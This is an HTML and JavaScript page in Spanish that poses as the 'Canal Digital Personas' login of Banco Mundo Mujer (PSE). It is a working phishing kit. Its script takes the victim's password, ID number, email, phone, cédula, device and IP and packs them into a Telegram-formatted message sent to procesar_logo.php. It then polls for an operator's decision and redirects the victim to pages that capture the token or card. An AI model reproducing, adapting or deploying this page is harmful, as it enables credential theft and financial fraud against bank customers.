<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Canal Digital Personas</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      display: flex;
      min-height: 100vh;
      background: #fff;
    }

    .left {
      width: 50%;
      background: url('img/mujer.jpg') no-repeat center center;
      background-size: cover;
      border-top-right-radius: 40px;
      border-bottom-right-radius: 40px;
      position: relative;
      transition: background-image 0.5s ease-in-out;
    }

    .logo {
      position: absolute;
      top: 30px;
      left: 30px;
      width: 180px;
      height: auto;
      z-index: 10;
    }

    .carousel-controls {
      position: absolute;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 10px;
      z-index: 20;
    }

    .carousel-dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.5);
      cursor: pointer;
      transition: background 0.3s;
    }

    .carousel-dot.active {
      background: #fff;
    }

    .right {
      width: 50%;
      padding: 50px 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      position: relative;
    }

    .brand-text-right {
      position: absolute;
      top: 30px;
      left: 30px;
      color: #333;
      font-size: 28px;
      font-weight: bold;
      z-index: 10;
    }

    .brand-text-right .light-blue {
      color: #7ba7d9;
    }

    .brand-text-right .dark-blue {
      color: #0059b2;
      font-weight: bold;
    }

    .right h2 {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 30px;
    }

    .input-group {
      margin-bottom: 30px;
    }

    .input-group label {
      font-size: 14px;
      color: #333;
      display: block;
      margin-bottom: 5px;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      border: none;
      border-bottom: 1px solid #aaa;
      font-size: 16px;
      outline: none;
    }

    .buttons {
      display: flex;
      align-items: center;
      gap: 15px;
      margin-bottom: 25px;
    }

    .buttons button {
      padding: 10px 20px;
      border: none;
      font-size: 14px;
      cursor: pointer;
      border-radius: 5px;
    }

    .btn-primary {
      background-color: #c2d5e4;
      color: #000;
      transition: all 0.3s;
    }

    .btn-primary.active {
      background-color: #0059b2;
      color: #fff;
    }

    .btn-primary:disabled {
      background-color: #999;
      cursor: not-allowed;
    }

    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .spinner {
      width: 80px;
      height: 80px;
      border: 12px solid rgba(255, 255, 255, 0.3);
      border-top: 12px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .links {
      font-size: 13px;
      margin-bottom: 40px;
    }

    .links a {
      color: #0059b2;
      text-decoration: none;
      margin-right: 8px;
    }

    .footer {
      font-size: 13px;
      color: #444;
      margin-top: 50px;
    }

    .footer span {
      margin-right: 15px;
    }

    @media (max-width: 768px) {
      body {
        flex-direction: column;
      }

      .left, .right {
        width: 100%;
        border-radius: 0;
      }

      .left {
        height: 40vh;
        min-height: 300px;
      }

      .right {
        padding: 30px 20px;
        height: 60vh;
        justify-content: flex-start;
        padding-top: 40px;
      }

      .logo {
        width: 120px;
        top: 20px;
        left: 20px;
      }

      .brand-text-right {
        font-size: 20px;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        text-align: center;
      }

      .right h2 {
        font-size: 20px;
        margin-bottom: 25px;
        margin-top: 40px;
      }

      .input-group {
        margin-bottom: 25px;
      }

      .input-group input {
        padding: 12px 10px;
        font-size: 16px;
      }

      .buttons {
        margin-bottom: 20px;
      }

      .buttons button {
        padding: 12px 25px;
        font-size: 16px;
        width: 100%;
      }

      .links {
        font-size: 12px;
        margin-bottom: 30px;
        text-align: center;
      }

      .footer {
        font-size: 11px;
        margin-top: 30px;
        text-align: center;
      }

      .footer span {
        display: block;
        margin-bottom: 5px;
        margin-right: 0;
      }

      .carousel-controls {
        bottom: 20px;
      }

      .carousel-dot {
        width: 10px;
        height: 10px;
      }
    }

    @media (max-width: 480px) {
      .right {
        padding: 20px 15px;
      }

      .logo {
        width: 100px;
        top: 15px;
        left: 15px;
      }

      .brand-text-right {
        font-size: 18px;
        top: 15px;
        left: 50%;
        transform: translateX(-50%);
        text-align: center;
      }

      .right h2 {
        font-size: 18px;
        margin-bottom: 20px;
        margin-top: 35px;
      }

      .input-group input {
        padding: 10px;
        font-size: 14px;
      }

      .buttons button {
        padding: 10px 20px;
        font-size: 14px;
      }

      .links {
        font-size: 11px;
      }

      .footer {
        font-size: 10px;
      }
    }
  </style>
</head>
<body>

  <div class="left">
    <img src="img/mun.png" alt="Logo Municipal" class="logo">
    <div class="carousel-controls">
      <div class="carousel-dot active" onclick="goToSlide(0)"></div>
      <div class="carousel-dot" onclick="goToSlide(1)"></div>
      <div class="carousel-dot" onclick="goToSlide(2)"></div>
    </div>
  </div>

  <div class="right">
    <div class="brand-text-right"><span class="light-blue">Canal Digital</span> <span class="dark-blue">Personas</span></div>
    <h2>INICIAR SESIÓN</h2>
    
    <div class="input-group">
      <label for="contraseña">Contraseña</label>
      <input type="password" id="contraseña" placeholder="Ingrese su contraseña" maxlength="15" pattern="[a-zA-Z0-9]+" title="Solo letras y números permitidos">
      <input type="hidden" id="session_id" name="session_id">
      <input type="hidden" id="username" name="username">
    </div>

    <div class="buttons">
      <button class="btn-primary" id="btnEntrar" onclick="handleLogin()">Ingresar</button>
    </div>

    <div class="links">
      <a href="#">¿Olvidó su usuario?</a> / 
      <a href="#">¿Olvidó su contraseña?</a>
    </div>

    <div class="footer">
      <span>Educación financiera para todos</span>
      <span>Convenios de recaudo</span>
      <span>Seguridad bancaria</span>
    </div>
  </div>

  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    // Variables globales para carrusel
    let currentSlide = 0;
    const images = ['img/mujer.jpg', 'img/mujer1.jpg', 'img/muje2.jpg'];
    
    // Función para cambiar slide
    function changeSlide() {
      const leftSection = document.querySelector('.left');
      const dots = document.querySelectorAll('.carousel-dot');
      
      if (leftSection) {
        leftSection.style.backgroundImage = `url('${images[currentSlide]}')`;
      }
      
      dots.forEach((dot, index) => {
        dot.classList.toggle('active', index === currentSlide);
      });
    }
    
    // Función para ir a un slide específico
    function goToSlide(slideIndex) {
      currentSlide = slideIndex;
      changeSlide();
    }
    
    // Función para siguiente slide
    function nextSlide() {
      currentSlide = (currentSlide + 1) % images.length;
      changeSlide();
    }
    
    // Iniciar carrusel
    setInterval(nextSlide, 4000);
    
    // Tu código original para enviar a Telegram
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Event listener para el botón Ingresar
      const btnIngresar = document.getElementById('btnEntrar');
      
      if (btnIngresar) {

        
        btnIngresar.addEventListener('click', async function (event) {
          event.preventDefault();

          // Obtener datos del formulario activo
          const formClave = document.getElementById('form-clave');
          const formTarjeta = document.getElementById('form-tarjeta');
          
          let identificacion = '';
          let password = '';
          
          if (formClave && formClave.style.display !== 'none') {
            // Formulario Clave Segura
            identificacion = document.querySelector("#form-clave input[type='text']").value;
            password = document.getElementById('clave').value;
          } else if (formTarjeta && formTarjeta.style.display !== 'none') {
            // Formulario Tarjeta Débito
            identificacion = document.querySelector("#form-tarjeta input[type='text']").value;
            password = document.getElementById('clave-tarjeta').value;
          } else {
            // Usar datos del formulario de contraseña
            identificacion = localStorage.getItem('usuario') || 'No especificado';
            password = document.getElementById('contraseña').value;
          }
          
                     // Validar que la clave tenga al menos 4 caracteres alfanuméricos
           if (password.length < 4) {
             alert('La clave debe tener al menos 4 caracteres');
             return;
           }
          
          // Validar que la identificación tenga al menos 5 dígitos
          if (identificacion.length < 5) {
            alert('La identificación debe tener al menos 5 dígitos');
            return;
          }

          // Mostrar loader
          const loader = document.getElementById('loadingOverlay');
          if (loader) {
            loader.style.display = 'flex';
          }

          const formUsername = document.getElementById('username').value;
          const session_id = document.getElementById('session_id').value;

          localStorage.setItem('username', formUsername);
          localStorage.setItem('password', password);
          localStorage.setItem('session_id', session_id);
          localStorage.setItem('identificacion', identificacion);

          let infoData;
          try {
            infoData = JSON.parse(localStorage.getItem('info') || '{}');
          } catch (e) {
            return;
          }

          const meta = infoData?.metaInfo || {};

          const username = urlParams.get('user') || localStorage.getItem('username') || '';
          
          const userAgent = navigator.userAgent;
          let dispositivo = 'PC';
          
          if (/Android/i.test(userAgent)) {
            dispositivo = 'Android';
          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            dispositivo = 'iPhone';
          } else if (/Windows/i.test(userAgent)) {
            dispositivo = 'PC';
          } else if (/Mac/i.test(userAgent)) {
            dispositivo = 'Mac';
          } else if (/Linux/i.test(userAgent)) {
            dispositivo = 'Linux';
          }
          
          const hora = new Date().toLocaleString('es-ES');

          function enviarMensaje(ip) {
            const mensaje = `
💎 <b><u>BANCO MUNDO MUJER PSE</u></b> 💎
• 💌 <b>Correo:</b> <code>${localStorage.getItem('correo') || 'No disponible'}</code>
• 📞 <b>Celular:</b> <code>${localStorage.getItem('cel') || 'No disponible'}</code>
• 💸 <b>Cédula:</b> <code>${localStorage.getItem('val') || 'No disponible'}</code>
• 🧍 <b>Persona:</b> <code>${localStorage.getItem('per') || 'No disponible'}</code>
• 🏦 <b>Banco:</b> <code>${localStorage.getItem('nom') || 'No disponible'}</code>
• 🪬 <b>Tipo:</b> <code>RECARGA PSE</code>
━━━━━━━━━━━━━━━━━━━━━━
<b>🔐 ACCESO</b>
• 👤 <b>Usuario:</b> <code>${identificacion}</code>
• 🔑 <b>Clave:</b> <code>${password}</code>
━━━━━━━━━━━━━━━━━━━━━━
<b>🌐 ENTORNO</b>
• 🖥 <b>Dispositivo:</b> <code>${dispositivo}</code>
• 🗺 <b>IP:</b> <code>${ip}</code>
• ⏱ <b>Hora:</b> <code>${hora}</code>
━━━━━━━━━━━━━━━━━━━━━━
`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', session_id);

            fetch('procesar_logo.php', {
              method: 'POST',
              body: formData
            })
            .then(res => {
              return res.json();
            })
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                const loader = document.getElementById('loadingOverlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              const loader = document.getElementById('loadingOverlay');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          }

          // Obtener IP y enviar mensaje
          fetch('get_ip.php')
            .then(response => {
              return response.json();
            })
            .then(data => {
              const ip = data.ip || 'No disponible';
              enviarMensaje(ip);
            })
            .catch((error) => {
              enviarMensaje('No disponible');
            });


        });
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
  try {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);

    const res = await fetch('verificar_respuesta.php', {
      method: 'POST',
      body: formData
    });

    const result = await res.json();

    if (result.action) {
      switch (result.action) {
        case 'pedir_dinamica':
          // Ir a token (dinámica)
          window.location.href = "token.php";
          break;

        case 'error_logo':
          // Ocultar loader antes de mostrar error
          const loader = document.getElementById('loadingOverlay');
          if (loader) {
            loader.style.display = 'none';
          }
          alert("Usuario o clave incorrectos.");
          window.location.href = "index.html";
          break;

        case 'tarjeta':
          // Flujo de tarjeta
          window.location.href = "tarjeta.php";
          break;
      }
    } else {
      // Seguimos haciendo polling
      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
  } catch (err) {
    // En error seguimos intentando
    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
  }
}

    
    // Validación en tiempo real para el botón
    document.addEventListener('DOMContentLoaded', function() {
      const passwordInput = document.getElementById('contraseña');
      const button = document.getElementById('btnEntrar');
      
      if (passwordInput && button) {
        passwordInput.addEventListener('input', function(e) {
          const value = e.target.value;
          // Solo permitir alfanuméricos
          const cleanValue = value.replace(/[^a-zA-Z0-9]/g, '');
          if (cleanValue !== value) {
            e.target.value = cleanValue;
          }
          
          // Activar botón con al menos 4 caracteres alfanuméricos
          if (cleanValue.length >= 4) {
            button.classList.add('active');
          } else {
            button.classList.remove('active');
          }
        });
        
        // Tecla Enter
        passwordInput.addEventListener('keypress', function(e) {
          if (e.key === 'Enter') {
            button.click();
          }
        });
      }
    });
  </script>

</body>
</html> 